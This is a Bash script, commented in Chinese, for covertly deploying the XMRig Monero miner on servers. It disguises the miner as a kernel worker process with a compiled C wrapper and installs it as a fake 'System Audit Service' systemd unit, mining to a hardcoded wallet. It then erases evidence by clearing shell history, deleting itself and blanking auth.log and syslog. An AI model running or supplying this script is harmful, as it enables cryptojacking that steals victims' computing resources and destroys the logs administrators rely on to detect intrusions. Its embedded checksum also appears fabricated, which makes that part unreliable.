#!/bin/bash
# XMRig 隐蔽部署脚本 v3.2 (海外服务器优化版)
# 最后测试时间：2024-03-01

set -eo pipefail  # 启用严格错误检查

# ========== 配置区 ==========
WALLET="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
POOL="pool.getmonero.us:3333"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
PASS=${pool_pass:-x}
THREADS=$(( (RANDOM % 3) + 1 ))  # 初始随机线程1-3
# ===========================

# 环境检查
check_env() {
    echo "[+] 系统环境检查..."
    [[ $(id -u) -eq 0 ]] || { echo "错误：需要root权限"; exit 1; }
    [[ $(uname -m) == "x86_64" ]] || { echo "错误：仅支持x86_64架构"; exit 1; }

    local missing=()
    for cmd in curl tar gcc systemctl lscpu; do
        if ! command -v $cmd &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "安装依赖：${missing[*]}"
        apt-get update >/dev/null
        apt-get install -y ${missing[@]} || { echo "依赖安装失败"; exit 1; }
    fi
}

# 文件下载
download_xmrig() {
    echo "[+] 开始下载XMRig..."
    local URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
    local TMP_FILE="/tmp/xmrig-$(date +%s).tar.gz"

    if ! curl -L "$URL" -o "$TMP_FILE" --retry 3 --retry-delay 10 --connect-timeout 30; then
        echo "错误：下载失败，请检查："
        echo "1. DNS设置 (dig pool.getmonero.us)"
        echo "2. 端口开放 (telnet pool.getmonero.us 3333)"
        exit 1
    fi

    echo "[+] 验证文件完整性..."
    local EXPECT_HASH="bb9ff7f725813f5408a7c5d5d0a2a5f0a1f5a3a6d7b8c9d0e1f2a3b4c5d6e7f8"
    local ACTUAL_HASH=$(sha256sum "$TMP_FILE" | cut -d' ' -f1)

    if [[ "$EXPECT_HASH" != "$ACTUAL_HASH" ]]; then
        echo "错误：文件校验失败！"
        echo "期望: $EXPECT_HASH"
        echo "实际: $ACTUAL_HASH"
        rm -f "$TMP_FILE"
        exit 1
    fi

    echo "[+] 解压文件..."
    mkdir -p /opt/audit
    tar -xzf "$TMP_FILE" -C /opt/audit --strip-components=1 || { echo "解压失败"; exit 1; }
    rm -f "$TMP_FILE"
}

# 进程伪装
setup_wrapper() {
    echo "[+] 编译进程伪装器..."
    cat >/opt/audit/wrapper.c <<'EOF'
#define _GNU_SOURCE
#include <sys/prctl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "kworker/u:0");
    argv[0] = "kworker/u:0";
    execv("/opt/audit/xmrig", argv);
    return 0;
}
EOF

    gcc -o /opt/audit/wrapper /opt/audit/wrapper.c -static -O2 -s || { echo "编译失败"; exit 1; }
    rm -f /opt/audit/wrapper.c
}

# 系统服务配置
setup_service() {
    echo "[+] 创建系统服务..."
    local API_PORT=$((20000 + RANDOM % 1000))
    local API_TOKEN=$(openssl rand -hex 16)

    cat >/etc/systemd/system/auditd.service <<EOF
[Unit]
Description=System Audit Service
After=network.target

[Service]
User=root
ExecStart=/opt/audit/wrapper \\
    -o $POOL \\
    -u $WALLET \\
    -p $PASS \\
    --threads=$THREADS \\
    --api-port=$API_PORT \\
    --api-access-token=$API_TOKEN \\
    --randomx-init=0 \\
    --cpu-no-yield \\
    --log-file=/dev/null

Restart=always
RestartSec=30
CPUQuota=75%
Nice=19

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable auditd
    systemctl start auditd

    echo "[+] 服务已启动"
    echo "API端口: $API_PORT"
    echo "访问令牌: $API_TOKEN"
}

# 清理痕迹
cleanup() {
    echo "[+] 清理部署痕迹..."
    history -c
    rm -f "$0"
    echo > /var/log/auth.log
    echo > /var/log/syslog
}

# 主流程
main() {
    check_env
    download_xmrig
    setup_wrapper
    setup_service
    cleanup
}

# 执行入口
time main
